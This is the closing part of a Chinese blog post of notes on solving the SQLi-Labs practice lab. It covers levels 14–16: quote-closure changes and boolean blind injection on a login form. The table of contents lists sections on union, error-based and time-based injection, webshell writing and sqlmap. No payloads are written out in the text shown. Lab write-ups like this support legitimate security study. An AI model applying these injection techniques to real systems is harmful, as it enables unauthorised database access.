<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712224626560.png" alt="image-20240712224626560"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712224746999.png" alt="image-20240712224746999"></p>
<p>flag{db3db0cf-f2d7-4506-8658-88062c6e44cd}</p>
<h3 id="Less-14-Double-Injection-double-quotes"><a href="#Less-14-Double-Injection-double-quotes" class="headerlink" title="Less-14 Double Injection-double quotes"></a>Less-14 <em>Double Injection-double quotes</em></h3><p>闭合的方式变成了<code>"</code>，其余不变。</p>
<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>输入正确的用户名和密码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712160203641.png" alt="image-20240712160203641"></p>
<p>输入错误的用户名和密码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712160254622.png" alt="image-20240712160254622"></p>
<p>页面只返回是否查询成功时，我们可以进行盲注。</p>
<h4 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/sqli.png" alt="sqli"></p>
<h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>闭合改为<code>")</code>，其余不变。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://holybeagle.github.io">Quuiieet</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://holybeagle.github.io/2024/07/09/2024-07-09-sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">http://holybeagle.github.io/2024/07/09/2024-07-09-sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://holybeagle.github.io" target="_blank">Quuiieet's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/03/24/2024-03-24-Flask%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/" title="安装笔记(Flask,docker+wsl)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">安装笔记(Flask,docker+wsl)</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Quuiieet</div><div class="author-info__description">だからサイレンス 灯すためと</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HolyBeagle"><i class="fab fa-github"></i><span>Follow</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/HolyBeagle" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:quuiieet@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">不接稿不接广告</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-number">1.</span> <span class="toc-text">MySQL数据结构</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#GET"><span class="toc-number"></span> <span class="toc-text">GET</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-based"><span class="toc-number">1.</span> <span class="toc-text">Error based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1-single-quote"><span class="toc-number">1.1.</span> <span class="toc-text">Less-1 single quote</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#union%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.</span> <span class="toc-text">union注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2-Intiger-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Less-2 Intiger Based</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E3%80%81%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E3%80%81%E6%98%BE%E9%94%99%E4%BD%8D"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">判断注入、字段长度、显错位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E7%88%86%E5%87%BA%E5%BA%93%E5%90%8D%EF%BC%9A"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">联合注入爆出库名：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E7%88%86%E5%87%BA%E8%A1%A8%E5%90%8D%EF%BC%9A"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">联合注入爆出表名：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E7%88%86%E5%87%BA%E5%88%97%E5%90%8D%EF%BC%9A"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">联合注入爆出列名：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%86%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.0.5.</span> <span class="toc-text">爆出数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3-Single-quotes-with-twist"><span class="toc-number">1.3.</span> <span class="toc-text">Less-3 Single quotes with twist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4-Double-quotes"><span class="toc-number">1.4.</span> <span class="toc-text">Less-4 Double quotes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-Injection"><span class="toc-number">2.</span> <span class="toc-text">Double Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5-single-quotes"><span class="toc-number">2.1.</span> <span class="toc-text">Less-5 single quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">报错注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6-Double-quotes"><span class="toc-number">2.2.</span> <span class="toc-text">Less-6 Double quotes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dump-into-outfile"><span class="toc-number">3.</span> <span class="toc-text">Dump into outfile</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7"><span class="toc-number">3.1.</span> <span class="toc-text">Less-7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E9%A9%AC"><span class="toc-number">3.1.1.</span> <span class="toc-text">写马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show-variables-like-%E2%80%98-secure-%E2%80%99"><span class="toc-number">3.1.2.</span> <span class="toc-text">show variables like ‘%secure%’;</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind"><span class="toc-number">4.</span> <span class="toc-text">Blind</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8-Boolian-Based"><span class="toc-number">4.1.</span> <span class="toc-text">Less-8 Boolian Based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.1.1.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#python%E8%84%9A%E6%9C%AC"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">python脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9-Time-Based-single-quotes"><span class="toc-number">4.2.</span> <span class="toc-text">Less-9 Time Based-single quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.1.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-1"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#python%E8%84%9A%E6%9C%AC-1"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">python脚本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap"><span class="toc-number">4.2.1.3.</span> <span class="toc-text">使用sqlmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10-Time-Based-double-quotes"><span class="toc-number">4.3.</span> <span class="toc-text">Less-10 Time Based-double quotes</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POST"><span class="toc-number"></span> <span class="toc-text">POST</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11-single-quotes"><span class="toc-number">1.1.</span> <span class="toc-text">Less-11 single quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12-double-quotes-with-twist"><span class="toc-number">1.2.</span> <span class="toc-text">Less-12 double quotes with twist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13-Double-Injection-single-quotes"><span class="toc-number">1.3.</span> <span class="toc-text">Less-13 Double Injection-single quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14-Double-Injection-double-quotes"><span class="toc-number">1.4.</span> <span class="toc-text">Less-14 Double Injection-double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15"><span class="toc-number">1.5.</span> <span class="toc-text">Less-15</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16"><span class="toc-number">1.6.</span> <span class="toc-text">Less-16</span></a></li></ol></li></ol></li></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/09/2024-07-09-sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/" title="sqli-lab通关笔记">sqli-lab通关笔记</a><time datetime="2024-07-08T16:00:00.000Z" title="发表于 2024-07-09 00:00:00">2024-07-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/24/2024-03-24-Flask%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/" title="安装笔记(Flask,docker+wsl)">安装笔记(Flask,docker+wsl)</a><time datetime="2024-03-23T16:00:00.000Z" title="发表于 2024-03-24 00:00:00">2024-03-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/21/2024-03-21-Python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E8%87%AA%E5%AD%98%EF%BC%89/" title="Python基础知识（自存）">Python基础知识（自存）</a><time datetime="2024-03-20T16:00:00.000Z" title="发表于 2024-03-21 00:00:00">2024-03-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/10/2024-03-10-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="PHP反序列化学习笔记">PHP反序列化学习笔记</a><time datetime="2024-03-09T16:00:00.000Z" title="发表于 2024-03-10 00:00:00">2024-03-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/04/2024-03-04-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E7%AC%94%E8%AE%B0/" title="XSS跨站脚本攻击笔记">XSS跨站脚本攻击笔记</a><time datetime="2024-03-03T16:00:00.000Z" title="发表于 2024-03-04 00:00:00">2024-03-04</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2024 By Quuiieet</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I'm not a robot AI challenging you</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>